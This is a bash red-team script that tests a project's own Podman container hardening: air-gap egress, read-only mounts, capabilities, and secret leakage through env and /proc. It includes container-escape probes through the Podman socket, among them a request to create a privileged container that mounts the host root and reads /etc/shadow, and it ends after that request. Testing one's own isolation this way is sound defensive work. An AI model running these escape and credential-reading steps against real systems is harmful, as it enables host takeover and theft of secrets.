#!/usr/bin/env bash
# B3 v2 External Perimeter Red Team — Container, Network, Air Gap
#
# v2 additions (from security assessment 2026-02-28):
# - Phase 1: /proc/self/ info leakage from sentinel, mount validation,
#             runtime security posture verification, /proc/self/mounts
#             secret path leak check
# - Phase 2: Podman proxy enforcement, /proc/self exploitation vectors,
#             DNS side-channel testing
#
# Phase 1: Verification tests (infrastructure smoke) — fast, deterministic,
#           run before every B1/B2 session and after any compose changes.
# Phase 2: Active exploitation attempts — probes from inside containers
#           using podman exec. Requires live containers.
#
# Usage:
#   bash scripts/red_team_b3_v2.sh                    # Phase 1 only (default)
#   bash scripts/red_team_b3_v2.sh --phase 2          # Phase 2 only
#   bash scripts/red_team_b3_v2.sh --phase all        # Both phases
#   bash scripts/red_team_b3_v2.sh --phase 2 --destructive  # Include destructive tests
#
# Exit codes: 0 = all checks pass, 1 = one or more failed

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
COMPOSE_FILE="$PROJECT_DIR/podman-compose.yaml"
TIMESTAMP="$(date +%Y%m%d_%H%M%S)"
RESULTS_FILE="$PROJECT_DIR/benchmarks/b3_perimeter_v2_${TIMESTAMP}.jsonl"

# Containers
CTR_SENTINEL="sentinel"
CTR_OLLAMA="sentinel-ollama"

# ── Argument parsing ─────────────────────────────────────────────

PHASE="1"
DESTRUCTIVE=0

for arg in "$@"; do
    case "$arg" in
        --phase)    : ;; # value consumed below
        1|2|all)
            # Check if previous arg was --phase
            if [[ "${_PREV_ARG:-}" == "--phase" ]]; then
                PHASE="$arg"
            fi
            ;;
        --destructive) DESTRUCTIVE=1 ;;
        --help|-h)
            echo "Usage: $0 [--phase 1|2|all] [--destructive]"
            echo
            echo "  --phase 1        Phase 1 verification only (default)"
            echo "  --phase 2        Phase 2 exploitation only"
            echo "  --phase all      Both phases"
            echo "  --destructive    Include destructive tests (e.g. model deletion)"
            exit 0
            ;;
        *)
            echo "ERROR: Unknown argument: $arg"
            echo "Run $0 --help for usage"
            exit 1
            ;;
    esac
    _PREV_ARG="$arg"
done

# ── Counters ─────────────────────────────────────────────────────

PASS=0
FAIL=0
WARN=0
SKIP=0

# ── Output helpers ───────────────────────────────────────────────

_jsonl_escape() {
    # Collapse to single line, escape backslashes and double-quotes for JSON
    printf '%s' "$1" | tr '\n\r' '  ' | sed 's/\\/\\\\/g; s/"/\\"/g'
}

_jsonl() {
    # Write a JSONL entry. Args: phase section test status expected actual severity
    local phase="$1" section="$2" test_name="$3" status="$4"
    local expected="${5:-}" actual="${6:-}" severity="${7:-}"
    printf '{"version":"v2","phase":%s,"section":"%s","test":"%s","status":"%s","expected":"%s","actual":"%s","severity":"%s","timestamp":"%s"}\n' \
        "$phase" "$section" "$test_name" "$status" \
        "$(_jsonl_escape "$expected")" \
        "$(_jsonl_escape "$actual")" \
        "$severity" \
        "$(date -Iseconds)" >> "$RESULTS_FILE"
}

pass() {
    local section="$1" desc="$2" phase="${3:-1}"
    echo "  [PASS] $desc"
    PASS=$((PASS + 1))
    _jsonl "$phase" "$section" "$desc" "pass" "" "" ""
}

fail() {
    local section="$1" desc="$2" expected="${3:-}" actual="${4:-}" severity="${5:-S3}" phase="${6:-1}"
    echo "  [FAIL] $desc"
    [ -n "$expected" ] && echo "         Expected: $expected"
    [ -n "$actual" ] && echo "         Actual:   $actual"
    FAIL=$((FAIL + 1))
    _jsonl "$phase" "$section" "$desc" "fail" "$expected" "$actual" "$severity"
}

warn() {
    local section="$1" desc="$2" note="${3:-}" phase="${4:-1}"
    echo "  [WARN] $desc"
    [ -n "$note" ] && echo "         Note: $note"
    WARN=$((WARN + 1))
    _jsonl "$phase" "$section" "$desc" "warn" "" "$note" "backlog"
}

skip() {
    local section="$1" desc="$2" reason="${3:-}" phase="${4:-1}"
    echo "  [SKIP] $desc ($reason)"
    SKIP=$((SKIP + 1))
    _jsonl "$phase" "$section" "$desc" "skip" "" "$reason" ""
}

# ── Container helpers ────────────────────────────────────────────

container_running() {
    podman ps --format '{{.Names}}' 2>/dev/null | grep -q "^${1}$"
}

# Run a command inside a container, capture output and exit code.
# Returns: sets EXEC_OUT and EXEC_RC
EXEC_OUT=""
EXEC_RC=0
exec_in() {
    local ctr="$1"
    shift
    EXEC_OUT="$(podman exec "$ctr" "$@" 2>&1)" && EXEC_RC=0 || EXEC_RC=$?
}

# Check if a tool exists inside a container
tool_exists() {
    local ctr="$1" tool="$2"
    podman exec "$ctr" which "$tool" >/dev/null 2>&1
}

# ── Inspect helpers (read-only, no exec) ─────────────────────────

# Get a value from podman inspect using Go template
inspect_container() {
    local ctr="$1" fmt="$2"
    podman inspect "$ctr" --format "$fmt" 2>/dev/null
}

inspect_network() {
    local net="$1" fmt="$2"
    podman network inspect "$net" --format "$fmt" 2>/dev/null
}

# ── Banner ───────────────────────────────────────────────────────

echo "============================================================"
echo "  Sentinel B3 v2: External Perimeter Red Team"
echo "  $(date)"
echo "  Phase: $PHASE"
echo "  Results: $RESULTS_FILE"
echo "============================================================"
echo

# ── Pre-flight ───────────────────────────────────────────────────

if [ ! -f "$COMPOSE_FILE" ]; then
    echo "  ERROR: Compose file not found: $COMPOSE_FILE"
    exit 1
fi

if ! container_running "$CTR_SENTINEL"; then
    echo "  ERROR: $CTR_SENTINEL container not running"
    exit 1
fi

if ! container_running "$CTR_OLLAMA"; then
    echo "  ERROR: $CTR_OLLAMA container not running"
    exit 1
fi

echo "  Pre-flight: Both containers running"
echo

# Initialise results file
mkdir -p "$(dirname "$RESULTS_FILE")"
echo "" > "$RESULTS_FILE"


# ═══════════════════════════════════════════════════════════════════
# PHASE 1: Verification Tests
# ═══════════════════════════════════════════════════════════════════

run_phase_1() {

echo "Phase 1: Verification Tests"
echo "==========================="
echo

# ── 1. Air Gap Verification ─────────────────────────────────────

echo "1. Air gap verification"

# DNS resolution from ollama — must fail
exec_in "$CTR_OLLAMA" bash -c 'echo -e "GET / HTTP/1.0\r\nHost: google.com\r\n\r\n" > /dev/tcp/google.com/80' 2>/dev/null
if [ "$EXEC_RC" -ne 0 ]; then
    pass "air_gap" "DNS/TCP to google.com from ollama blocked"
else
    fail "air_gap" "DNS/TCP to google.com from ollama SUCCEEDED" "connection failure" "connection succeeded" "S0"
fi

# HTTP egress from ollama — try curl, fall back to python3, then /dev/tcp
if tool_exists "$CTR_OLLAMA" curl; then
    exec_in "$CTR_OLLAMA" curl -s --max-time 5 http://ifconfig.me
elif tool_exists "$CTR_OLLAMA" python3; then
    exec_in "$CTR_OLLAMA" python3 -c "import urllib.request; urllib.request.urlopen('http://ifconfig.me', timeout=5).read()"
else
    exec_in "$CTR_OLLAMA" bash -c 'echo -e "GET / HTTP/1.0\r\nHost: ifconfig.me\r\n\r\n" > /dev/tcp/ifconfig.me/80'
fi
if [ "$EXEC_RC" -ne 0 ]; then
    pass "air_gap" "HTTP egress from ollama blocked"
else
    fail "air_gap" "HTTP egress from ollama SUCCEEDED" "connection failure" "got response" "S0"
fi

# HTTPS egress from ollama
if tool_exists "$CTR_OLLAMA" curl; then
    exec_in "$CTR_OLLAMA" curl -s --max-time 5 https://api.anthropic.com
elif tool_exists "$CTR_OLLAMA" python3; then
    exec_in "$CTR_OLLAMA" python3 -c "import urllib.request; urllib.request.urlopen('https://api.anthropic.com', timeout=5).read()"
else
    exec_in "$CTR_OLLAMA" bash -c 'echo test > /dev/tcp/api.anthropic.com/443'
fi
if [ "$EXEC_RC" -ne 0 ]; then
    pass "air_gap" "HTTPS egress from ollama blocked"
else
    fail "air_gap" "HTTPS egress from ollama SUCCEEDED" "connection failure" "got response" "S0"
fi

# Raw TCP from ollama (1.1.1.1:53)
exec_in "$CTR_OLLAMA" bash -c 'echo test > /dev/tcp/1.1.1.1/53' 2>/dev/null
if [ "$EXEC_RC" -ne 0 ]; then
    pass "air_gap" "Raw TCP (1.1.1.1:53) from ollama blocked"
else
    fail "air_gap" "Raw TCP egress from ollama SUCCEEDED" "connection failure" "TCP connected" "S0"
fi

# Ollama only on sentinel_internal network (inspect, no exec)
OLLAMA_NETS="$(inspect_container "$CTR_OLLAMA" '{{json .NetworkSettings.Networks}}' 2>/dev/null)"
if echo "$OLLAMA_NETS" | grep -q "sentinel_internal" && ! echo "$OLLAMA_NETS" | grep -q "sentinel_egress"; then
    pass "air_gap" "Ollama only on sentinel_internal network"
else
    fail "air_gap" "Ollama network membership incorrect" "sentinel_internal only" "$OLLAMA_NETS" "S0"
fi

# Internal network has internal: true
INTERNAL_FLAG="$(inspect_network "sentinel_internal" '{{.Internal}}' 2>/dev/null)"
if [ "$INTERNAL_FLAG" = "true" ]; then
    pass "air_gap" "sentinel_internal network is internal:true"
else
    fail "air_gap" "sentinel_internal not marked as internal" "true" "$INTERNAL_FLAG" "S0"
fi

echo

# ── 2. Container Security Posture ───────────────────────────────

echo "2. Container security posture"

# sentinel read-only rootfs
exec_in "$CTR_SENTINEL" touch /app/test_b3_readonly
if [ "$EXEC_RC" -ne 0 ]; then
    pass "container_security" "sentinel rootfs is read-only"
else
    # Clean up if it somehow succeeded
    podman exec "$CTR_SENTINEL" rm -f /app/test_b3_readonly 2>/dev/null
    fail "container_security" "sentinel rootfs is WRITABLE" "read-only filesystem error" "touch succeeded" "S1"
fi

# v2: Runtime rootfs verification — test multiple paths (P2.5)
for test_path in /usr/test_b3 /var/test_b3 /opt/test_b3 /root/test_b3; do
    exec_in "$CTR_SENTINEL" touch "$test_path"
    if [ "$EXEC_RC" -ne 0 ]; then
        pass "container_security" "sentinel rootfs read-only at $test_path"
    else
        podman exec "$CTR_SENTINEL" rm -f "$test_path" 2>/dev/null
        fail "container_security" "sentinel rootfs WRITABLE at $test_path" "EROFS" "touch succeeded" "S1"
    fi
done

# sentinel /tmp noexec — test in two steps to distinguish copy-failure from exec-failure
exec_in "$CTR_SENTINEL" bash -c 'cp /usr/bin/echo /tmp/echo_b3_test'
if [ "$EXEC_RC" -ne 0 ]; then
    skip "container_security" "sentinel /tmp noexec check" "cp to /tmp failed — cannot test exec"
else
    # Copy succeeded — now test if execution is blocked (noexec)
    exec_in "$CTR_SENTINEL" bash -c '/tmp/echo_b3_test test'
    if [ "$EXEC_RC" -ne 0 ]; then
        pass "container_security" "sentinel /tmp is noexec"
    else
        fail "container_security" "sentinel /tmp allows execution" "permission denied" "exec succeeded" "S1"
    fi
    podman exec "$CTR_SENTINEL" rm -f /tmp/echo_b3_test 2>/dev/null || true
fi

# v2: /tmp noexec — also test via script write + execute
exec_in "$CTR_SENTINEL" bash -c 'echo "#!/bin/sh" > /tmp/test_noexec.sh && chmod +x /tmp/test_noexec.sh && /tmp/test_noexec.sh'
if [ "$EXEC_RC" -ne 0 ]; then
    pass "container_security" "sentinel /tmp noexec blocks script execution"
else
    fail "container_security" "sentinel /tmp allows script execution" "permission denied" "script ran" "S1"
fi
podman exec "$CTR_SENTINEL" rm -f /tmp/test_noexec.sh 2>/dev/null || true

# sentinel runs as root (known gap)
exec_in "$CTR_SENTINEL" whoami
if [ "$EXEC_OUT" = "root" ]; then
    warn "container_security" "sentinel runs as root" "Known gap — rootless Podman mitigates but USER directive missing from Containerfile"
else
    pass "container_security" "sentinel runs as non-root user ($EXEC_OUT)"
fi

# ollama runs as root (known gap)
exec_in "$CTR_OLLAMA" whoami
if [ "$EXEC_OUT" = "root" ]; then
    warn "container_security" "sentinel-ollama runs as root" "Known gap — rootless Podman mitigates"
else
    pass "container_security" "sentinel-ollama runs as non-root user ($EXEC_OUT)"
fi

# sentinel capabilities — check for dangerous caps
exec_in "$CTR_SENTINEL" cat /proc/1/status
CAP_LINE="$(echo "$EXEC_OUT" | grep "^CapEff:" || echo "")"
if [ -n "$CAP_LINE" ]; then
    # CapEff is a hex bitmask (up to 64 bits). Use Python for reliable arithmetic.
    # CAP_SYS_ADMIN = bit 21 (0x200000), CAP_NET_RAW = bit 13 (0x2000)
    CAP_HEX="$(echo "$CAP_LINE" | awk '{print $2}')"
    if [ -z "$CAP_HEX" ]; then
        skip "container_security" "sentinel capabilities" "could not parse CapEff value"
    else
        CAP_SYS_ADMIN=$(python3 -c "print((int('$CAP_HEX',16) >> 21) & 1)" 2>/dev/null || echo "0")
        CAP_NET_RAW=$(python3 -c "print((int('$CAP_HEX',16) >> 13) & 1)" 2>/dev/null || echo "0")
        if [ "$CAP_SYS_ADMIN" -eq 1 ]; then
            fail "container_security" "sentinel has CAP_SYS_ADMIN" "no CAP_SYS_ADMIN" "CAP_SYS_ADMIN present" "S1"
        else
            pass "container_security" "sentinel lacks CAP_SYS_ADMIN"
        fi
        if [ "$CAP_NET_RAW" -eq 1 ]; then
            warn "container_security" "sentinel has CAP_NET_RAW" "Known gap — consider --cap-drop=ALL"
        else
            pass "container_security" "sentinel lacks CAP_NET_RAW"
        fi
        # Log full cap set for reference
        _jsonl "1" "container_security" "sentinel_capabilities_hex" "info" "" "$CAP_HEX" ""
    fi
else
    skip "container_security" "sentinel capabilities" "could not read /proc/1/status"
fi

# ollama read-only rootfs (known gap — Ollama needs writable fs)
exec_in "$CTR_OLLAMA" touch /tmp/test_b3_ollama_rw
if [ "$EXEC_RC" -eq 0 ]; then
    podman exec "$CTR_OLLAMA" rm -f /tmp/test_b3_ollama_rw 2>/dev/null || true
    warn "container_security" "sentinel-ollama rootfs is writable" "Known gap — Ollama requires writable fs for model weights"
else
    pass "container_security" "sentinel-ollama rootfs is read-only"
fi

# Resource limits — sentinel
SENTINEL_MEM="$(inspect_container "$CTR_SENTINEL" '{{.HostConfig.Memory}}' 2>/dev/null)"
if [ -n "$SENTINEL_MEM" ] && [ "$SENTINEL_MEM" != "0" ] && [ "$SENTINEL_MEM" != "<no value>" ]; then
    # 4G = 4294967296
    pass "container_security" "sentinel memory limit set ($(( SENTINEL_MEM / 1024 / 1024 ))MB)"
else
    fail "container_security" "sentinel has no memory limit" "4G" "${SENTINEL_MEM:-unset}" "S2"
fi

# Resource limits — ollama
OLLAMA_MEM="$(inspect_container "$CTR_OLLAMA" '{{.HostConfig.Memory}}' 2>/dev/null)"
if [ -n "$OLLAMA_MEM" ] && [ "$OLLAMA_MEM" != "0" ] && [ "$OLLAMA_MEM" != "<no value>" ]; then
    pass "container_security" "sentinel-ollama memory limit set ($(( OLLAMA_MEM / 1024 / 1024 ))MB)"
else
    fail "container_security" "sentinel-ollama has no memory limit" "14G" "${OLLAMA_MEM:-unset}" "S2"
fi

echo

# ── 3. Network Segmentation ─────────────────────────────────────

echo "3. Network segmentation"

# sentinel can reach Claude API (via sentinel_egress)
exec_in "$CTR_SENTINEL" python3 -c "
import urllib.request, ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
try:
    urllib.request.urlopen('https://api.anthropic.com', timeout=5, context=ctx)
except urllib.error.HTTPError:
    pass  # 401/403 is fine — means we connected
"
if [ "$EXEC_RC" -eq 0 ]; then
    pass "network" "sentinel can reach api.anthropic.com (egress works)"
else
    fail "network" "sentinel cannot reach api.anthropic.com" "connection success" "connection failed" "S1"
fi

# sentinel can reach ollama API (via sentinel_internal)
exec_in "$CTR_SENTINEL" python3 -c "
import urllib.request
urllib.request.urlopen('http://sentinel-ollama:11434/api/tags', timeout=5).read()
"
if [ "$EXEC_RC" -eq 0 ]; then
    pass "network" "sentinel can reach sentinel-ollama:11434 (internal works)"
else
    fail "network" "sentinel cannot reach sentinel-ollama" "connection success" "connection failed" "S1"
fi

# ollama can reach sentinel (same internal network — expected but document it)
exec_in "$CTR_OLLAMA" bash -c 'echo -e "GET / HTTP/1.0\r\nHost: sentinel\r\n\r\n" > /dev/tcp/sentinel/8443' 2>/dev/null
if [ "$EXEC_RC" -eq 0 ]; then
    _jsonl "1" "network" "ollama_can_reach_sentinel" "info" "" "ollama can reach sentinel:8443 on internal network" ""
    echo "  [INFO] sentinel-ollama can reach sentinel:8443 (same internal network — expected)"
else
    pass "network" "sentinel-ollama cannot initiate connections to sentinel"
fi

# No unexpected listeners on sentinel
exec_in "$CTR_SENTINEL" bash -c 'cat /proc/net/tcp 2>/dev/null || echo "unavailable"'
if echo "$EXEC_OUT" | grep -q "unavailable"; then
    # Try ss if available
    if tool_exists "$CTR_SENTINEL" ss; then
        exec_in "$CTR_SENTINEL" ss -tlnp
        echo "  [INFO] sentinel listeners: $(echo "$EXEC_OUT" | grep LISTEN | awk '{print $4}' | tr '\n' ' ')"
    else
        skip "network" "sentinel listener check" "neither /proc/net/tcp nor ss available"
    fi
else
    # Parse /proc/net/tcp — port is in hex at field 2 (after colon)
    LISTEN_PORTS="$(echo "$EXEC_OUT" | awk '$4 == "0A" {split($2, a, ":"); printf "%d ", strtonum("0x"a[2])}')"
    EXPECTED_PORTS="8443 8080"
    UNEXPECTED=""
    for port in $LISTEN_PORTS; do
        if [ "$port" != "8443" ] && [ "$port" != "8080" ]; then
            UNEXPECTED="$UNEXPECTED $port"
        fi
    done
    if [ -z "$UNEXPECTED" ]; then
        pass "network" "sentinel has only expected listeners (8443, 8080)"
    else
        fail "network" "sentinel has unexpected listeners" "8443, 8080 only" "also:$UNEXPECTED" "S2"
    fi
fi

# Host port exposure — only sentinel's mapped ports
HOST_PORTS="$(ss -tlnp 2>/dev/null | grep -E ':3001|:3002' || echo "")"
if [ -n "$HOST_PORTS" ]; then
    pass "network" "host ports 3001/3002 are bound (sentinel mapped ports)"
else
    skip "network" "host port check" "ss not available or ports not found"
fi

echo

# ── 4. Secrets and Volume Exposure ───────────────────────────────

echo "4. Secrets and volume exposure"

# Secrets not in environment variables
exec_in "$CTR_SENTINEL" env
SENTINEL_ENV="$EXEC_OUT"
SECRET_LEAK=""
# Check for actual secret values in env (not just config var names)
# The config vars like SENTINEL_PIN_FILE are paths, not secrets — that's fine.
# We're checking that no env var contains an actual API key, PIN value, or token.
for pattern in "sk-ant-" "ANTHROPIC_API_KEY=" "CLAUDE_API_KEY=" "SENTINEL_PIN="; do
    if echo "$SENTINEL_ENV" | grep -q "$pattern"; then
        SECRET_LEAK="$SECRET_LEAK $pattern"
    fi
done
if [ -z "$SECRET_LEAK" ]; then
    pass "secrets" "No secret values leaked in sentinel environment variables"
else
    fail "secrets" "Secret values found in sentinel env vars" "no secrets in env" "found:$SECRET_LEAK" "S0"
fi

# Secrets readable as files with appropriate permissions
exec_in "$CTR_SENTINEL" ls -la /run/secrets/
if [ "$EXEC_RC" -eq 0 ]; then
    pass "secrets" "Secret files exist at /run/secrets/"
    # Check file permissions
    if echo "$EXEC_OUT" | grep -q "claude_api_key" && echo "$EXEC_OUT" | grep -q "sentinel_pin"; then
        pass "secrets" "Both claude_api_key and sentinel_pin present"
    else
        fail "secrets" "Missing expected secret files" "claude_api_key + sentinel_pin" "$EXEC_OUT" "S1"
    fi
else
    fail "secrets" "Secret files not mounted at /run/secrets/" "files present" "directory not found" "S1"
fi

# Policies mounted read-only
exec_in "$CTR_SENTINEL" touch /policies/test_b3_ro
if [ "$EXEC_RC" -ne 0 ]; then
    pass "secrets" "Policies directory is read-only"
else
    podman exec "$CTR_SENTINEL" rm -f /policies/test_b3_ro 2>/dev/null || true
    fail "secrets" "Policies directory is WRITABLE" "read-only" "touch succeeded" "S1"
fi

# Ollama cannot see sentinel secrets
exec_in "$CTR_OLLAMA" ls /run/secrets/
if [ "$EXEC_RC" -ne 0 ]; then
    pass "secrets" "sentinel-ollama has no access to /run/secrets/"
else
    fail "secrets" "sentinel-ollama CAN see /run/secrets/" "no access" "directory accessible" "S0"
fi

# Workspace exists and is constrained to sentinel only
exec_in "$CTR_SENTINEL" ls /workspace
if [ "$EXEC_RC" -eq 0 ]; then
    pass "secrets" "sentinel has /workspace mount"
else
    fail "secrets" "sentinel missing /workspace" "present" "not found" "S2"
fi

# Log directory writable (intentional — bind mount)
exec_in "$CTR_SENTINEL" bash -c 'touch /logs/test_b3_log && rm /logs/test_b3_log'
if [ "$EXEC_RC" -eq 0 ]; then
    pass "secrets" "Log directory is writable (intentional bind mount)"
else
    fail "secrets" "Log directory not writable" "writable" "write failed" "S2"
fi

# v2: /proc/self/mounts — check secret file paths not leaked (assessment Section 1.4)
exec_in "$CTR_SENTINEL" cat /proc/self/mounts
MOUNTS_OUT="$EXEC_OUT"
if [ "$EXEC_RC" -eq 0 ]; then
    # Check if mount table reveals secret file names on the host filesystem
    SECRET_PATHS=""
    for secret_name in claude_api_key sentinel_pin hf_token; do
        # Look for host paths containing secret names (not just /run/secrets/ which is expected)
        if echo "$MOUNTS_OUT" | grep -v "/run/secrets" | grep -q "$secret_name"; then
            SECRET_PATHS="$SECRET_PATHS $secret_name"
        fi
    done
    if [ -z "$SECRET_PATHS" ]; then
        pass "secrets" "/proc/self/mounts does not leak secret host paths"
    else
        fail "secrets" "/proc/self/mounts reveals secret host paths" "no host paths" "found:$SECRET_PATHS" "S2"
    fi
    _jsonl "1" "secrets" "sentinel_mounts_dump" "info" "" "$(echo "$MOUNTS_OUT" | head -20)" ""
else
    skip "secrets" "/proc/self/mounts secret path check" "cannot read /proc/self/mounts"
fi

# v2: /proc/self/mountinfo — more detailed mount info with host source paths
exec_in "$CTR_SENTINEL" cat /proc/self/mountinfo
MOUNTINFO_OUT="$EXEC_OUT"
if [ "$EXEC_RC" -eq 0 ]; then
    # mountinfo shows the source path on the host — check for sensitive info
    HOST_PATHS=""
    for sensitive in "/home/" "/root/" "/.secrets/" "/etc/shadow"; do
        if echo "$MOUNTINFO_OUT" | grep -q "$sensitive"; then
            HOST_PATHS="$HOST_PATHS $sensitive"
        fi
    done
    if [ -z "$HOST_PATHS" ]; then
        pass "secrets" "/proc/self/mountinfo does not leak sensitive host paths"
    else
        warn "secrets" "/proc/self/mountinfo reveals host paths" "Exposed: $HOST_PATHS — informational, not directly exploitable from inside container"
    fi
else
    skip "secrets" "/proc/self/mountinfo host path check" "cannot read /proc/self/mountinfo"
fi

echo

# ── 5. /proc/self/ Information Leakage (v2) ─────────────────────

echo "5. /proc/self/ information leakage (v2)"

# /proc/self/cgroup — reveals cgroup hierarchy (host info)
exec_in "$CTR_SENTINEL" cat /proc/self/cgroup
if [ "$EXEC_RC" -eq 0 ] && [ -n "$EXEC_OUT" ]; then
    _jsonl "1" "proc_info" "sentinel_cgroup" "info" "" "$EXEC_OUT" "S4"
    # Check if cgroup reveals the host username or machine-specific paths
    if echo "$EXEC_OUT" | grep -q "/user.slice/user-"; then
        warn "proc_info" "/proc/self/cgroup reveals host user slice" \
            "cgroup path discloses host UID — aids targeted attacks"
    else
        pass "proc_info" "/proc/self/cgroup does not leak host user info"
    fi
else
    pass "proc_info" "/proc/self/cgroup not readable"
fi

# /proc/self/status — reveals PID, capabilities, memory maps
exec_in "$CTR_SENTINEL" cat /proc/self/status
if [ "$EXEC_RC" -eq 0 ]; then
    # Already checking CapEff in section 2, but also check for unexpected capabilities
    CAP_AMB="$(echo "$EXEC_OUT" | grep "^CapAmb:" | awk '{print $2}')"
    if [ -n "$CAP_AMB" ] && [ "$CAP_AMB" != "0000000000000000" ]; then
        fail "proc_info" "sentinel has ambient capabilities" "0000000000000000" "$CAP_AMB" "S2"
    else
        pass "proc_info" "sentinel has no ambient capabilities"
    fi
    _jsonl "1" "proc_info" "sentinel_proc_status" "info" "" "$(echo "$EXEC_OUT" | head -15)" ""
else
    skip "proc_info" "sentinel /proc/self/status" "cannot read"
fi

# /proc/self/cmdline — reveals process command line
exec_in "$CTR_SENTINEL" cat /proc/self/cmdline
if [ "$EXEC_RC" -eq 0 ]; then
    # cmdline should not contain secrets (API keys, PINs)
    CMDLINE_TEXT="$(echo "$EXEC_OUT" | tr '\0' ' ')"
    CMD_SECRETS=""
    for pattern in "sk-ant-" "pin=" "api_key=" "token="; do
        if echo "$CMDLINE_TEXT" | grep -iq "$pattern"; then
            CMD_SECRETS="$CMD_SECRETS $pattern"
        fi
    done
    if [ -z "$CMD_SECRETS" ]; then
        pass "proc_info" "/proc/self/cmdline does not contain secrets"
    else
        fail "proc_info" "/proc/self/cmdline contains secrets" "no secrets" "found:$CMD_SECRETS" "S1"
    fi
else
    pass "proc_info" "/proc/self/cmdline not readable"
fi

# /proc/self/environ — should not be readable from other processes
exec_in "$CTR_SENTINEL" cat /proc/1/environ
if [ "$EXEC_RC" -eq 0 ]; then
    ENVIRON_TEXT="$(echo "$EXEC_OUT" | tr '\0' ' ')"
    # Check PID 1's environment for secrets
    ENV_SECRETS=""
    for pattern in "sk-ant-" "ANTHROPIC_API_KEY" "SENTINEL_PIN="; do
        if echo "$ENVIRON_TEXT" | grep -q "$pattern"; then
            ENV_SECRETS="$ENV_SECRETS $pattern"
        fi
    done
    if [ -n "$ENV_SECRETS" ]; then
        fail "proc_info" "/proc/1/environ leaks secrets" "no secrets in PID 1 env" "found:$ENV_SECRETS" "S1"
    else
        pass "proc_info" "/proc/1/environ does not contain secrets"
    fi
else
    pass "proc_info" "/proc/1/environ not readable (good — protects init process)"
fi

# /proc/self/net/arp — reveals ARP table from inside
exec_in "$CTR_SENTINEL" cat /proc/self/net/arp
if [ "$EXEC_RC" -eq 0 ]; then
    ARP_ENTRIES="$(echo "$EXEC_OUT" | wc -l)"
    _jsonl "1" "proc_info" "sentinel_arp_table" "info" "" "ARP entries: $ARP_ENTRIES" "S4"
    echo "  [INFO] /proc/self/net/arp accessible ($ARP_ENTRIES entries)"
else
    pass "proc_info" "/proc/self/net/arp not readable"
fi

echo

# ── 6. Mount Validation (v2) ────────────────────────────────────

echo "6. Mount validation (v2)"

# Verify ONLY expected paths are writable in sentinel container
# Expected writable: /workspace, /tmp, /logs, /run (for secrets)
# Everything else should be read-only or not writable

WRITABLE_PATHS_OK=1
for test_path in /etc /usr /bin /sbin /lib /opt /srv /var; do
    exec_in "$CTR_SENTINEL" bash -c "touch ${test_path}/test_b3_writability 2>/dev/null && rm -f ${test_path}/test_b3_writability"
    if [ "$EXEC_RC" -eq 0 ]; then
        fail "mount_validation" "${test_path} is writable (should be read-only)" "EROFS" "writable" "S2"
        WRITABLE_PATHS_OK=0
    fi
done
if [ "$WRITABLE_PATHS_OK" -eq 1 ]; then
    pass "mount_validation" "All system paths (/etc, /usr, /bin, etc.) are read-only"
fi

# Verify expected writable paths ARE writable
for test_path in /workspace /tmp /logs; do
    exec_in "$CTR_SENTINEL" bash -c "touch ${test_path}/test_b3_writability 2>/dev/null && rm -f ${test_path}/test_b3_writability"
    if [ "$EXEC_RC" -eq 0 ]; then
        pass "mount_validation" "${test_path} is writable (expected)"
    else
        fail "mount_validation" "${test_path} is NOT writable (should be)" "writable" "EROFS or permission denied" "S2"
    fi
done

# Count total mount points from /proc/self/mounts
exec_in "$CTR_SENTINEL" bash -c 'cat /proc/self/mounts | wc -l'
MOUNT_COUNT="$EXEC_OUT"
_jsonl "1" "mount_validation" "sentinel_mount_count" "info" "" "mount_count=$MOUNT_COUNT" ""
echo "  [INFO] sentinel has $MOUNT_COUNT mount points"

# Check for unexpected volume mounts (host paths that shouldn't be there)
exec_in "$CTR_SENTINEL" bash -c 'cat /proc/self/mounts | grep -v "^proc\|^tmpfs\|^devtmpfs\|^sysfs\|^cgroup\|^devpts\|^mqueue\|^shm"'
if [ "$EXEC_RC" -eq 0 ]; then
    _jsonl "1" "mount_validation" "sentinel_bind_mounts" "info" "" "$EXEC_OUT" ""
    echo "  [INFO] Non-system mounts:"
    echo "$EXEC_OUT" | while IFS= read -r line; do echo "         $line"; done
fi

echo

} # end run_phase_1


# ═══════════════════════════════════════════════════════════════════
# PHASE 2: Active Exploitation Attempts
# ═══════════════════════════════════════════════════════════════════

run_phase_2() {

echo "Phase 2: Active Exploitation Attempts"
echo "======================================"
echo

# ── 5. Container Escape Vectors ──────────────────────────────────

echo "5. Container escape vectors"

# Podman socket abuse — list containers
exec_in "$CTR_SENTINEL" bash -c 'curl --unix-socket /run/podman/podman.sock http://d/v4.0.0/libpod/containers/json 2>/dev/null || python3 -c "
import http.client, socket, json
class PodmanConnection(http.client.HTTPConnection):
    def __init__(self, socket_path):
        super().__init__(\"localhost\")
        self.socket_path = socket_path
    def connect(self):
        self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        self.sock.connect(self.socket_path)
conn = PodmanConnection(\"/run/podman/podman.sock\")
conn.request(\"GET\", \"/v4.0.0/libpod/containers/json\")
resp = conn.getresponse()
data = json.loads(resp.read())
print(f\"CONTAINERS_VISIBLE: {len(data)}\")
for c in data:
    print(f\"  - {c.get(chr(78)+chr(97)+chr(109)+chr(101)+chr(115), [chr(63)])[0]}\")
"'
if [ "$EXEC_RC" -eq 0 ] && echo "$EXEC_OUT" | grep -q "CONTAINERS_VISIBLE\|sentinel"; then
    fail "escape" "Podman socket readable — containers visible from inside sentinel" \
        "no socket access" "can list containers" "S1" "2"
    echo "         HIGHEST-RISK VECTOR: code inside sentinel can control other containers"
    echo "         Output: $(echo "$EXEC_OUT" | head -5)"
else
    pass "escape" "Podman socket not accessible from sentinel" "2"
fi

# Podman socket — attempt to create a privileged container
exec_in "$CTR_SENTINEL" python3 -c "
import http.client, socket, json
class PC(http.client.HTTPConnection):
    def __init__(self, sp):
        super().__init__('localhost')
        self.sp = sp
    def connect(self):
        self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        self.sock.connect(self.sp)
conn = PC('/run/podman/podman.sock')
payload = json.dumps({
    'image': 'alpine',
    'cmd': ['cat', '/host/etc/shadow'],
    'host_config': {
        'binds': ['/:/host:ro'],
        'privileged': True
    }
})
conn.request('POST', '/v4.0.0/libpod/containers/create', body=payload,
             headers={'Content-Type': 'application/json'})
resp = conn.getresponse()
print(f'STATUS: {resp.status}')
print(resp.read().decode()[:200])
" 2>/dev/null
